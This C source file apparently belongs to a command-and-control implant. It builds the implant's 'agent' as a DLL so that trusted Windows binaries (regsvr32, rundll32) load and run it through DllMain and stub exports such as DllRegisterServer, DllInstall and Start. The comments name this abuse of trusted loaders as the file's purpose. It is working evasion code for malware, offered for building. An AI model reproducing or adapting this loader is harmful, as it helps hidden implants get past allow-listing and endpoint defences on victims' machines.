/*
 * dll_entry.c — DLL entry point for agent when built as a DLL.
 *
 * Provides DllMain + multiple well-known exports so the agent can be
 * loaded by trusted LOLBins:
 *   regsvr32 /s agent.dll          → DllRegisterServer
 *   rundll32 agent.dll,Start       → Start
 *   rundll32 agent.dll,DllInstall  → DllInstall
 *
 * DllMain(DLL_PROCESS_ATTACH) spawns the agent on a worker thread
 * (the thread cannot start until DllMain returns and the loader lock
 * is released).  Each export blocks with WaitForSingleObject so the
 * host process stays alive while the agent runs.
 */

#include <windows.h>

/* main() is defined in main.c — the normal agent entry point */
extern int main(void);

static HANDLE g_agent_thread = NULL;

static DWORD WINAPI _agent_thread_proc(LPVOID param)
{
    (void)param;
    main();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hDll, DWORD dwReason, LPVOID lpReserved)
{
    (void)lpReserved;
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hDll);
        g_agent_thread = CreateThread(NULL, 0, _agent_thread_proc, NULL, 0, NULL);
    }
    return TRUE;
}

/* ── Exports ── */

__declspec(dllexport) HRESULT __stdcall DllRegisterServer(void)
{
    if (g_agent_thread)
        WaitForSingleObject(g_agent_thread, INFINITE);
    return S_OK;
}

__declspec(dllexport) HRESULT __stdcall DllUnregisterServer(void)
{
    return S_OK;
}

__declspec(dllexport) HRESULT __stdcall DllInstall(BOOL bInstall,
                                                    LPCWSTR pszCmdLine)
{
    (void)bInstall;
    (void)pszCmdLine;
    if (g_agent_thread)
        WaitForSingleObject(g_agent_thread, INFINITE);
    return S_OK;
}

/* rundll32 callback signature */
__declspec(dllexport) void CALLBACK Start(HWND hwnd, HINSTANCE hinst,
                                           LPSTR cmd, int show)
{
    (void)hwnd;
    (void)hinst;
    (void)cmd;
    (void)show;
    if (g_agent_thread)
        WaitForSingleObject(g_agent_thread, INFINITE);
}
